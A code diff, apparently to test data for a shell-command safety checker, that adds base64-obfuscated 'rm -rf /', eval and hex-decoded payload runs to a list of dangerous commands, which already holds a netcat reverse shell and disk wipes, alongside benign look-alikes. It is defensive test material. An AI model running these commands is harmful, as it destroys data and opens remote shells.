@@ -39,6 +39,11 @@ DANGEROUS = [
     "nc 10.0.0.1 4444 -e /bin/sh",
     "wipefs -a /dev/sda",
     "shred -n 3 /dev/sda",
+    'bash -c "$(echo cm0gLXJmIC8= | base64 -d)"',
+    "echo cm0gLXJmIC8= | base64 --decode | sh",
+    "eval $(cat cmd.txt)",
+    'ls; eval "$X"',
+    "xxd -r -p payload.hex | bash",
 ]
 
 SECRETS = [
@@ -72,6 +77,9 @@ SAFE = [
     "passwd",
     "echo bypass=true",
     "journalctl -u nginx --since today",
+    "echo aGVsbG8= | base64 -d",
+    "base64 -d key.b64 > key.bin",
+    "grep -r evaluate src/",
 ]
 
 
